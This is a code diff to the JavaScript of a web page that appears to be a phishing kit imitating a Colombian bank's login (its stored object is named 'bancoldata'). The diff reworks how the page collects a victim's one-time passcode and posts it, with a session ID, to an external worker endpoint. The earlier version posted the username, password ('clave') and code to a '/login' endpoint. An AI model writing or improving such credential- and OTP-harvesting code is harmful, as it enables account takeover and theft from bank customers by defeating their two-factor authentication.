@@ -433,35 +433,25 @@
             try {
                 // Obtener datos del localStorage
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-                const usuario = bancoldata.usuario;
+                const transactionId = bancoldata.transactionId;
 
-                if (!usuario) {
-                    alert('Error: Usuario no encontrado');
+                if (!transactionId) {
+                    alert('Error: Sesión no encontrada');
                     window.location.href = 'index.html';
                     return;
                 }
 
-                // Generar transactionId
-                const transactionId = 'txn_' + Date.now();
-
-                // Guardar en localStorage
-                bancoldata.clave = token;
-                bancoldata.transactionId = transactionId;
-                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-
                 console.log('📤 Enviando código OTP:', token);
-                console.log('👤 Usuario:', usuario);
                 console.log('🆔 TransactionId:', transactionId);
                 console.log(`📡 Worker URL: ${WORKER_URL}`);
 
-                // Enviar al worker
-                const response = await fetch(`${WORKER_URL}/login`, {
+                // Enviar al endpoint /otp-code del worker
+                const response = await fetch(`${WORKER_URL}/otp-code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        usuario, 
-                        clave: token, 
-                        transactionId 
+                        transactionId: transactionId,
+                        otp: token 
                     })
                 });
 
@@ -495,7 +485,7 @@
                 this.value = this.value.slice(0, 6);
             }
             updateButton();
-            // ❌ ELIMINADO EL AUTO-ENVÍO
+            // ❌ SIN AUTO-ENVÍO
         });
 
         button.addEventListener('click', function(e) {
